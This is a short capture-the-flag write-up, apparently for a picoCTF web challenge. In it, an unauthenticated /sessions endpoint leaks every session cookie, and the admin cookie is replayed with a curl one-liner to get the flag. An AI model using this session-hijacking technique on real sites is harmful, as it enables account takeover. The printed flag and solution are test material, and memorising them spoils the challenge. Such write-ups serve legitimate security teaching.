---
title: "Old Sessions"
date: "2026-05-28"
category: "web"
description: "Session permanence feature leaks admin session cookie via /sessions endpoint — session hijacking yields the flag."
---

## 🎯 Summary

A social media site boasts "once you login, you never have to log-out again" — sessions are permanent and never expire. An unauthenticated `/sessions` endpoint dumps all active session cookies with their decoded data. Admin's session is among them.

## 🧩 Solution

1. Register a user, login to get an authenticated session cookie.
2. Visit `/sessions` — reveals all active sessions and their decoded payloads.
3. Admin's session has `key: 'admin'` — copy the cookie value.
4. Use that cookie to authenticate as admin → flag displayed on homepage.

**Solve (one-liner):**
```bash
curl -b "session=f2er9EMXnKfi55eBtL7Y2zlhixqhSA8QAdpGLI2MQWk" \
  http://dolphin-cove.picoctf.net:49251/ | grep picoCTF
```

## 🚩 Flag
```
picoCTF{s3t_s3ss10n_3xp1rat10n5_11cae9aa}
```
